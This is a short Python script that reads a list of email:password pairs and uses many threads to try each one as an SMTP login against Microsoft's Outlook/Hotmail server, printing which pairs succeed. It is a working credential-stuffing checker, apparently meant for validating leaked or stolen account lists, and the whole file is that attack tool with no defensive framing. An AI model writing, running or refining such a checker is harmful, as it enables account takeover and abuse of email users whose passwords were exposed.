import smtplib
import traceback
import concurrent.futures

def check_hotmail(email, password):
    try:
        smtp_server = "smtp-mail.outlook.com"
        smtp_port = 587
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(email, password)
        server.quit()
        return "Raw response: Login Successful"
    except smtplib.SMTPAuthenticationError as e:
        return f"Raw response: {e.smtp_error.decode('utf-8')}"  # Decoding raw SMTP response
    except Exception as e:
        return f"Raw response: {str(e)}\n{traceback.format_exc()}"

def process_accounts(file_path):
    results = []
    with open(file_path, 'r') as file:
        accounts = file.readlines()

    def handle_account(line):
        email, password = line.strip().split(":")
        response = check_hotmail(email, password)
        return f"{email}:{password} => {response}"

    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(handle_account, line) for line in accounts]
        for future in concurrent.futures.as_completed(futures):
            results.append(future.result())

    return results

if __name__ == "__main__":
    input_file = "hot.txt"
    results = process_accounts(input_file)
    for result in results:
        print(result)
